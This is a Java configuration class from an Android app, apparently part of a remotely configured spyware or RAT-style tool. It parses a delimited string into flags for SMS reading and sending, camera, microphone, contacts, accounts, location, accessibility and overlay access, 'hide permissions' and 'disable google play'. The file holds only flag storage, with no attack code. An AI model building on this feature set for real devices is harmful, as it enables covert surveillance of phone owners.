package com.icontrol.protector;

import android.content.Context;
import android.content.SharedPreferences;

public class ConfigManager {
    private static final String PREF_NAME = "BTConfig";
    private static final String IS_INITIALIZED = "BTInitialized";

    // Short variable names for all configurations
    public boolean add_accss;  // addAccess
    public boolean req_accss;  // requestAccess
    public boolean add_draw;  // addDrawOverApps
    public boolean req_draw;  // requestDrawOverApps
    public boolean add_backdata;  // addBackgroundDataUsage
    public boolean req_backdata;  // requestBackgroundDataUsage
    public boolean add_usagacc;  // addUsageAccess
    public boolean req_usagacc;  // requestUsageAccess
    public boolean add_settngs;  // addChangePhoneSettings
    public boolean req_settngs;  // requestChangePhoneSettings
    public boolean add_btryoptm; // addBatteryOptimization
    public boolean req_btryoptm; // requestBatteryOptimization
    public boolean add_files;  // addFilesAccess
    public boolean req_files;  // requestFilesAccess
    public boolean add_cam; // addCameraAccess
    public boolean req_cam; // requestCameraAccess
    public boolean add_mic; // addMicrophoneAccess
    public boolean req_mic; // requestMicrophoneAccess
    public boolean add_sms; // addReadSMS
    public boolean req_sms; // requestReadSMS
    public boolean add_ssms;  // addSendSMS
    public boolean req_ssms;  // requestSendSMS
    public boolean add_Rcontct;  // addReadContacts
    public boolean req_Rcontct;  // requestReadContacts
    public boolean add_accunts;  // addReadAccounts
    public boolean req_accunts;  // requestReadAccounts

    public boolean add_notifiction;  // addnotifi
    public boolean req_notification;  // requestnotifi
    public boolean add_hidp;  // null
    public boolean req_hidp;  // hide permissions

    public boolean add_stopplay;  // disable google play
    public boolean req_StopPlay;  //disable google play

    public boolean add_location;  // disable google play
    public boolean req_location;  //disable google play

    // Singleton instance
    private static ConfigManager instance;

    private ConfigManager() {}

    public static ConfigManager getInstance() {
        if (instance == null) {
            instance = new ConfigManager();
        }
        return instance;
    }

    // Initialize configurations
    public void initialize(Context context, String allConfig) {
        SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);

        // Check if it's the first time
        if (!prefs.getBoolean(IS_INITIALIZED, false)) {
            String[] configParts = allConfig.split("\\[\\*]"); // Split by "[*]"
            SharedPreferences.Editor editor = prefs.edit();

            // Store parsed values in SharedPreferences
            parseAndStore(editor, configParts);

            editor.putBoolean(IS_INITIALIZED, true); // Mark initialization as complete
            editor.apply();
        }

        // Load all values into memory
        loadFromPreferences(context);
    }

    // Parse and store values into SharedPreferences
    private void parseAndStore(SharedPreferences.Editor editor, String[] configParts) {
        saveConfig(editor, "aA", "rA", configParts, 0);  // Access
        saveConfig(editor, "aD", "rD", configParts, 1);  // Draw Over Apps
        saveConfig(editor, "aB", "rB", configParts, 2);  // Background Data Usage
        saveConfig(editor, "aU", "rU", configParts, 3);  // Usage Access
        saveConfig(editor, "aC", "rC", configParts, 4);  // Change Phone Settings
        saveConfig(editor, "aBo", "rBo", configParts, 5); // Battery Optimization
        saveConfig(editor, "aF", "rF", configParts, 6);  // Files Access
        saveConfig(editor, "aCam", "rCam", configParts, 7); // Camera Access
        saveConfig(editor, "aMic", "rMic", configParts, 8); // Microphone Access
        saveConfig(editor, "aSms", "rSms", configParts, 9); // Read SMS
        saveConfig(editor, "aSS", "rSS", configParts, 10); // Send SMS
        saveConfig(editor, "aRC", "rRC", configParts, 11); // Read Contacts
        saveConfig(editor, "aRA", "rRA", configParts, 12); // Read Accounts
        saveConfig(editor, "aRN", "rRN", configParts, 13); // show notifiction
        saveConfig(editor, "aHP", "rHP", configParts, 14); // hide permissions
        saveConfig(editor, "aDP", "rDP", configParts, 15); // disable play store
        saveConfig(editor, "aLOC", "rLOC", configParts, 16); // request location
    }

    // Save individual config parts
    private void saveConfig(SharedPreferences.Editor editor, String addKey, String reqKey, String[] configParts, int index) {
        if (configParts.length > index) {
            String[] parts = configParts[index].split("\\|");
            editor.putBoolean(addKey, parts[0].equals("1"));
            editor.putBoolean(reqKey, parts[1].equals("1"));
        } else {
            editor.putBoolean(addKey, false);
            editor.putBoolean(reqKey, false);
        }
    }

    // Load all values from SharedPreferences into memory
    private void loadFromPreferences(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);

        add_accss = prefs.getBoolean("aA", false);
        req_accss = prefs.getBoolean("rA", false);
        add_draw = prefs.getBoolean("aD", false);
        req_draw = prefs.getBoolean("rD", false);
        add_backdata = prefs.getBoolean("aB", false);
        req_backdata = prefs.getBoolean("rB", false);
        add_usagacc = prefs.getBoolean("aU", false);
        req_usagacc = prefs.getBoolean("rU", false);
        add_settngs = prefs.getBoolean("aC", false);
        req_settngs = prefs.getBoolean("rC", false);
        add_btryoptm = prefs.getBoolean("aBo", false);
        req_btryoptm = prefs.getBoolean("rBo", false);
        add_files = prefs.getBoolean("aF", false);
        req_files = prefs.getBoolean("rF", false);
        add_cam = prefs.getBoolean("aCam", false);
        req_cam = prefs.getBoolean("rCam", false);
        add_mic = prefs.getBoolean("aMic", false);
        req_mic = prefs.getBoolean("rMic", false);
        add_sms = prefs.getBoolean("aSms", false);
        req_sms = prefs.getBoolean("rSms", false);
        add_ssms = prefs.getBoolean("aSS", false);
        req_ssms = prefs.getBoolean("rSS", false);
        add_Rcontct = prefs.getBoolean("aRC", false);
        req_Rcontct = prefs.getBoolean("rRC", false);
        add_accunts = prefs.getBoolean("aRA", false);
        req_accunts = prefs.getBoolean("rRA", false);
        add_notifiction = prefs.getBoolean("aRN", false);
        req_notification = prefs.getBoolean("rRN", false);
        add_hidp = prefs.getBoolean("aHP", false);
        req_hidp = prefs.getBoolean("rHP", false);
        add_stopplay = prefs.getBoolean("aDP", false);//disable google play
        req_StopPlay = prefs.getBoolean("rDP", false);
        add_location = prefs.getBoolean("aLOC", false);
        req_location = prefs.getBoolean("rLOC", false);
    }
}
